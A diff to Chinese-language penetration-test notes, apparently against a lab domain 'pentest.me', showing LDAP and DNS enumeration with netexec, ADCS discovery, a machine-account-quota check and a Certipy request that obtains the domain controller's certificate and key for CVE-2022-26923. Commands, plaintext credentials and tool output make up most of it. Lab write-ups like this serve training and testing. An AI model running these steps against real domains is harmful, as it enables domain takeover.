@@ -721,6 +721,24 @@ LDAP        172.24.7.3      389    DC               [+] pentest.me\usera:Admin3g
 GET-NETWORK 172.24.7.3      389    DC               [*] Querying zone for records
 GET-NETWORK 172.24.7.3      389    DC               Found 9 records
 GET-NETWORK 172.24.7.3      389    DC               [+] Dumped 9 records to /Users/zhaochoudemao/.nxc/logs/pentest.me_network_2026-06-03_163823.log
+
+cat /Users/zhaochoudemao/.nxc/logs/pentest.me_network_2026-06-03_163823.log
+@.pentest.me 	 172.24.7.3
+@.pentest.me 	 172.25.12.9
+@.pentest.me 	 dc.pentest.me.
+_msdcs.pentest.me 	 dc.pentest.me.
+dc.pentest.me 	 172.25.12.9
+dc.pentest.me 	 172.24.7.3
+iZmn9u6zo3vtrnZ.pentest.me 	 172.24.7.16
+iZmn9u6zo3vtrpZ.pentest.me 	 172.24.7.43
+iZaysxe6vcuhb4Z.pentest.me 	 172.24.7.48
+
+awk '{print $NF}' /Users/zhaochoudemao/.nxc/logs/pentest.me_network_2026-06-03_163823.log \
+    | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' \
+    | mapcidr -aa -silent \
+    | mapcidr -a -silent
+172.24.7.0/26
+172.25.12.9/32
 ```
  
 用 ldapsearch（原生、最稳、无依赖）
@@ -742,12 +760,20 @@ ldapsearch -x -H ldap://172.24.7.3 \
   name dnsRecord
 ```
 
-==//TODO 存在 ADCS==
+存在 ADCS:
+```bash
+proxychains4 -f /usr/local/etc/proxychains-24.conf -q nxc ldap 172.24.7.3 -u usera -p Admin3gv83 -d pentest.me --dns-server 172.24.7.3 -M adcs
+LDAP        172.24.7.3      389    DC               [*] Windows 10 / Server 2016 Build 14393 (name:DC) (domain:pentest.me) (signing:None) (channel binding:Never) 
+LDAP        172.24.7.3      389    DC               [+] pentest.me\usera:Admin3gv83 
+ADCS        172.24.7.3      389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
+ADCS        172.24.7.3      389    DC               Found PKI Enrollment Server: DC.pentest.me
+ADCS        172.24.7.3      389    DC               Found CN: pentest-DC-CA
+```
 
 查看域 MAQ 属性，使用域用户 `usera@pentest.me` 打 `CVE-2022-26923` 漏洞：
-```
-☁  endless  PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -q nxc --dns-server 172.24.7.3 ldap 172.24.7.3 -u usera -p Admin3gv83 -d pentest.me -M maq
-LDAP        172.24.7.3      389    DC               [*] Windows 10 / Server 2016 Build 14393 (name:DC) (domain:pentest.me)
+```bash
+proxychains4 -f /usr/local/etc/proxychains-24.conf -q nxc ldap 172.24.7.3 -u usera -p Admin3gv83 -d pentest.me --dns-server 172.24.7.3 -M maq
+LDAP        172.24.7.3      389    DC               [*] Windows 10 / Server 2016 Build 14393 (name:DC) (domain:pentest.me) (signing:None) (channel binding:Never) 
 LDAP        172.24.7.3      389    DC               [+] pentest.me\usera:Admin3gv83 
 MAQ         172.24.7.3      389    DC               [*] Getting the MachineAccountQuota
 MAQ         172.24.7.3      389    DC               MachineAccountQuota: 10
@@ -790,19 +816,14 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
 使用该机器账户向 ADCS 服务器请求域控的证书：
 ```bash
-☁  endless  PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -f -q certipy-ad req \
+proxychains4 -f /usr/local/etc/proxychains-24.conf -q certipy req \
   -u 'EVILCOMPUTER1$@pentest.me' \
   -p '123@#ABC' \
   -dc-ip 172.24.7.3 \
   -ca 'pentest-DC-CA' \
   -template Machine \
   -target-ip 172.24.7.3 \
-  -ns 172.24.7.3 \
-  -dns-tcp \
   -debug
-[proxychains] config file found: /etc/proxychains4-24.conf
-[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
-[proxychains] DLL init: proxychains-ng 4.17
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
 [+] DC host (-dc-host) not specified. Using domain as DC host
@@ -816,28 +837,26 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [+] Generating RSA key
 [*] Requesting certificate via RPC
 [+] Trying to connect to endpoint: ncacn_np:172.24.7.3[\pipe\cert]
-[proxychains] Strict chain  ...  101.132.149.233:6001  ...  172.24.7.3:445  ...  OK
 [+] Connected to endpoint: ncacn_np:172.24.7.3[\pipe\cert]
-[*] Request ID is 6
+[*] Request ID is 11
 [*] Successfully requested certificate
 [*] Got certificate with DNS Host Name 'DC.pentest.me'
 [*] Certificate has no object SID
 [*] Try using -sid to set the object SID or see the wiki for more details
 [*] Saving certificate and private key to 'dc.pfx'
 [+] Attempting to write data to 'dc.pfx'
+File 'dc.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
 [+] Data written to 'dc.pfx'
 [*] Wrote certificate and private key to 'dc.pfx'
 ```
 关键参数解释（Certipy 5.0.4 版本）
 
-|参数|作用|为什么必须加|
-|---|---|---|
-|`-target-ip 172.24.7.3`|强制所有 RPC/LDAP/HTTP 请求直接发往这个 IP|替代了`-no-dns`的核心功能，让 Certipy 不解析 CA 服务器的域名，直接连接 IP|
-|`-ns 172.24.7.3`|指定 DNS 服务器为域控制器|确保即使有 DNS 查询，也会发往正确的内网 DNS 服务器|
-|`-dns-tcp`|强制使用 TCP 协议进行 DNS 查询|proxychains4 只能代理 TCP 流量，不能代理 UDP 的 DNS 请求|
-|`-f`|强制 proxychains 使用 fork 模式|提高对 Python 应用的兼容性，避免某些网络调用绕过代理|
-- **Certipy 在 4.0 版本后正式改名为 `certipy-ad`**，但大量旧教程仍在使用 `certipy` 这个旧命令名，这是最普遍的坑。
-- **`-no-dns` 参数在 Certipy 5.0.4 版本中被移除了**，但我们仍然可以通过其他参数实现完全相同的效果。
+| 参数                      | 作用                             | 为什么必须加                                            |
+| ----------------------- | ------------------------------ | ------------------------------------------------- |
+| `-target-ip 172.24.7.3` | 强制所有 RPC/LDAP/HTTP 请求直接发往这个 IP | 替代了`-no-dns`的核心功能，让 Certipy 不解析 CA 服务器的域名，直接连接 IP |
+| `-f`                    | 强制 proxychains 使用 fork 模式      | 提高对 Python 应用的兼容性，避免某些网络调用绕过代理                    |
+- Certipy 在 4.0 版本后正式改名为 `certipy-ad(仅在kali中，mac本地仍然是certipy)，但大量旧教程仍在使用 `certipy` 这个旧命令名，这是最普遍的坑。
+
 
 配置hosts，请求证书
 ```bash
